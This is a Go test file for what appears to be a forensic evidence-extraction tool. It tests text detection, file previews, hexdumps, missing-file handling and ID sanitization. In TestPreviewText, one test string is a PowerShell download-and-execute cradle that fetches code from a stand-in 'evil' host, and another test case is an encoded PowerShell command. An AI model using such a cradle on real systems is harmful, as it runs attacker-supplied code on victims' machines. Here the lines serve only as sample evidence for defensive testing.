package evidencex

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeTemp(t *testing.T, name string, data []byte) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, data, 0o644); err != nil {
		t.Fatalf("write temp: %v", err)
	}
	return p
}

func TestLooksText(t *testing.T) {
	cases := []struct {
		name string
		data []byte
		want bool
	}{
		{"ascii", []byte("powershell -enc ZQBjAGgAbwA="), true},
		{"utf8 jp", []byte("不審なスクリプト\n"), true},
		{"empty", []byte{}, true},
		{"nul byte", []byte("MZ\x00\x00\x90"), false},
		{"mostly ctrl", []byte{0x01, 0x02, 0x03, 0x04, 0x05, 'a'}, false},
	}
	for _, c := range cases {
		if got := looksText(c.data); got != c.want {
			t.Errorf("looksText(%s) = %v, want %v", c.name, got, c.want)
		}
	}
}

func TestPreviewText(t *testing.T) {
	body := "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')\n"
	p := writeTemp(t, "evil.ps1", []byte(body))
	r := FileResult{Target: `C:\Users\bob\evil.ps1`, Status: "ok", ExtractedPath: p,
		Bytes: int64(len(body)), SHA256: "abc123def456ff"}
	pv := Preview(r, DefaultCaps())
	if pv.Kind != "text" {
		t.Fatalf("Kind = %q, want text", pv.Kind)
	}
	if !strings.Contains(pv.Content, "DownloadString") {
		t.Fatalf("content missing body: %q", pv.Content)
	}
	if pv.Truncated {
		t.Fatalf("small file should not be truncated")
	}
}

func TestPreviewTextTruncated(t *testing.T) {
	body := strings.Repeat("A", 5000)
	p := writeTemp(t, "big.txt", []byte(body))
	r := FileResult{Target: "big.txt", Status: "ok", ExtractedPath: p, Bytes: 5000}
	pv := Preview(r, PreviewCaps{MaxTextBytes: 1000, MaxHexBytes: 256})
	if pv.Kind != "text" {
		t.Fatalf("Kind = %q, want text", pv.Kind)
	}
	if len(pv.Content) != 1000 {
		t.Fatalf("content len = %d, want 1000 (capped)", len(pv.Content))
	}
	if !pv.Truncated {
		t.Fatalf("expected Truncated=true for over-cap file")
	}
}

func TestPreviewBinary(t *testing.T) {
	data := append([]byte("MZ\x00\x00"), make([]byte, 64)...)
	p := writeTemp(t, "x.exe", data)
	r := FileResult{Target: "x.exe", Status: "ok", ExtractedPath: p, Bytes: int64(len(data))}
	pv := Preview(r, DefaultCaps())
	if pv.Kind != "binary" {
		t.Fatalf("Kind = %q, want binary", pv.Kind)
	}
	if !strings.Contains(pv.Content, "00000000") {
		t.Fatalf("hexdump missing offset column: %q", pv.Content)
	}
}

func TestPreviewMissing(t *testing.T) {
	r := FileResult{Target: `C:\nope.exe`, Status: "not_found"}
	pv := Preview(r, DefaultCaps())
	if pv.Kind != "missing" {
		t.Fatalf("Kind = %q, want missing", pv.Kind)
	}
	if !strings.Contains(pv.Note, "not present") {
		t.Fatalf("note = %q, want not-present", pv.Note)
	}
}

func TestBuildPreviewBlock(t *testing.T) {
	p := writeTemp(t, "a.txt", []byte("hello"))
	block := BuildPreviewBlock([]FilePreview{
		Preview(FileResult{Target: "a.txt", Status: "ok", ExtractedPath: p, Bytes: 5}, DefaultCaps()),
		Preview(FileResult{Target: "gone.dll", Status: "not_found"}, DefaultCaps()),
	})
	for _, want := range []string{"EXTRACTED FILES", "a.txt", "hello", "gone.dll", "NOT AVAILABLE", "END EXTRACTED FILES"} {
		if !strings.Contains(block, want) {
			t.Errorf("block missing %q\n---\n%s", want, block)
		}
	}
}

func TestSanitizeID(t *testing.T) {
	cases := map[string]string{
		"EV-001":      "EV-001",
		"ev/../x":     "ev_.._x",
		"a b:c":       "a_b_c",
		"":            "default",
		"good.name_1": "good.name_1",
	}
	for in, want := range cases {
		if got := sanitizeID(in); got != want {
			t.Errorf("sanitizeID(%q) = %q, want %q", in, got, want)
		}
	}
}
